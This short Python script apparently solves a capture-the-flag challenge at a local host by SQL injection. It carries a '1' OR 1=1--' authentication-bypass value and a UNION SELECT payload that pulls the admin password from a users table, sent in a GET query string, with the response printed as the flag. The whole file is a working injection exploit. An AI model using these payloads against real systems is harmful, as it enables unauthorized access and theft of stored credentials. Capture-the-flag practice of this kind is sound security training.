#!/usr/bin/python3

import requests
import os

from urllib.parse import quote,urlencode

url = "http://challenge.localhost/?query="
data = {
"username":"admin",
"user-secret":"1' OR 1=1--"
}
payload = '"+UNION+SELECT+password+FROM+users+WHERE+username=\'admin\'--'
url = url+payload
response = requests.get(url).text

print("The Flag: "+response)
